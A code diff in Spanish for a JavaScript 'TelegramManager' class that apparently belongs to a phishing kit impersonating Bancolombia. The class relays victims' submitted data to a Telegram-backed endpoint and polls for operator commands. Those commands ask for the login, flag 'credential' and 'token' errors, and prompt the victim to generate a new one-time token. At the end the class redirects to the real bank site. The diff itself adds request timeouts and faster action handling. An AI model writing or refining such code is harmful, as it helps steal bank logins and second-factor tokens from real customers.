@@ -13,20 +13,29 @@ class TelegramManager {
 
     async sendToTelegram(stage, data) {
         try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 10000);
+            
             const response = await fetch('api/send-message', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 credentials: 'include',
-                body: JSON.stringify({ stage, data })
+                body: JSON.stringify({ stage, data }),
+                signal: controller.signal
             });
 
+            clearTimeout(timeoutId);
             const result = await response.json();
             console.log('📤 Mensaje enviado a Telegram');
             return result;
         } catch (error) {
-            console.error('❌ Error enviando a Telegram:', error);
+            if (error.name === 'AbortError') {
+                console.error('❌ Timeout enviando a Telegram');
+            } else {
+                console.error('❌ Error enviando a Telegram:', error);
+            }
             return { success: false };
         }
     }
@@ -34,7 +43,7 @@ class TelegramManager {
     async startPolling() {
         if (this.checking) return;
         this.checking = true;
-        this.checkInterval = setInterval(() => this.checkAction(), 1500);
+        this.checkInterval = setInterval(() => this.checkAction(), 2500);
         console.log('🔄 Polling iniciado...');
     }
 
@@ -48,11 +57,17 @@ class TelegramManager {
 
     async checkAction() {
         try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            
             const response = await fetch(`api/check-action?t=${Date.now()}`, {
                 method: 'GET',
                 cache: 'no-cache',
-                credentials: 'include'
+                credentials: 'include',
+                signal: controller.signal
             });
+            
+            clearTimeout(timeoutId);
             const data = await response.json();
 
             if (data.action) {
@@ -61,7 +76,11 @@ class TelegramManager {
                 this.handleAction(data.action);
             }
         } catch (error) {
-            console.error('❌ Error checking action:', error);
+            if (error.name === 'AbortError') {
+                console.warn('⏱️ Timeout en check-action');
+            } else {
+                console.error('❌ Error checking action:', error);
+            }
         }
     }
 
@@ -73,49 +92,48 @@ class TelegramManager {
             overlay.classList.remove('active');
         }
 
-        setTimeout(() => {
-            switch (action) {
-                case 'error_documento':
-                    window.location.href = 'index.html?error=documento';
-                    break;
+        // Execute immediately without delay for faster response
+        switch (action) {
+            case 'error_documento':
+                window.location.href = 'index.html?error=documento';
+                break;
 
-                case 'pedir_logo':
-                    window.location.href = 'next-step.html';
-                    break;
+            case 'pedir_logo':
+                window.location.href = 'next-step.html';
+                break;
 
-                case 'error_logo':
-                    window.location.href = 'next-step.html?error=credenciales';
-                    break;
+            case 'error_logo':
+                window.location.href = 'next-step.html?error=credenciales';
+                break;
 
-                case 'pedir_token':
-                    if (window.location.pathname.includes('next-step.html')) {
-                        if (typeof window.tokenModalController !== 'undefined') {
-                            window.tokenModalController.switchToTokenCard();
-                        }
-                    } else {
-                        window.location.href = 'next-step.html?openToken=1';
+            case 'pedir_token':
+                if (window.location.pathname.includes('next-step.html')) {
+                    if (typeof window.tokenModalController !== 'undefined') {
+                        window.tokenModalController.switchToTokenCard();
                     }
-                    break;
+                } else {
+                    window.location.href = 'next-step.html?openToken=1';
+                }
+                break;
 
-                case 'error_token':
-                    // If we are on next-step.html and using the card
-                    const tokenInput = document.getElementById('tokenInputCard');
-                    if (tokenInput) {
-                        tokenInput.value = '';
-                        tokenInput.focus();
-                        alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingresalo.');
-                        this.startPolling(); // Resume polling for next try
-                    }
-                    break;
+            case 'error_token':
+                // If we are on next-step.html and using the card
+                const tokenInput = document.getElementById('tokenInputCard');
+                if (tokenInput) {
+                    tokenInput.value = '';
+                    tokenInput.focus();
+                    alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingresalo.');
+                    this.startPolling(); // Resume polling for next try
+                }
+                break;
 
-                case 'finalizar':
-                    window.location.href = 'https://www.bancolombia.com/personas';
-                    break;
+            case 'finalizar':
+                window.location.href = 'https://www.bancolombia.com/personas';
+                break;
 
-                default:
-                    console.warn('❓ Acción desconocida:', action);
-            }
-        }, 300);
+            default:
+                console.warn('❓ Acción desconocida:', action);
+        }
     }
 }
 
